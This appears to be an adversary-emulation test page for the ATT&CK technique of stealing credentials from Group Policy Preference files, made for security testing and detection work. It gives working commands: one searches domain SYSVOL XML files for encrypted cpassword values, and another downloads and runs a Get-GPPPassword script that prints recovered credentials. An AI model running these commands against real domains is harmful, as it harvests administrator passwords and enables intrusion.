# T1552.006 - Group Policy Preferences

### Attacks
* GPP Passwords (findstr)
	* Overview
Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.

```cmd
findstr /S cpassword %logonserver%\sysvol\*.xml
```

#### Dependencies:  Run with `powershell`!
##### Description: Computer must be domain joined
##### Check Prereq Commands:
```powershell
if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
Write-Host Joining this computer to a domain must be done manually
```

### Attacks
* GPP Passwords (Get-GPPPassword)
	* Overview
Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.

Successful test execution will either display the credentials found in the GPP files or indicate "No preference files found".


```powershell
. #{gpp_script_path}
Get-GPPPassword -Verbose
```

#### Dependencies:  Run with `powershell`!
##### Description: Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
##### Check Prereq Commands:
```powershell
if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1 } 
```
##### Get Prereq Commands:
```powershell
New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
```
##### Description: Computer must be domain joined
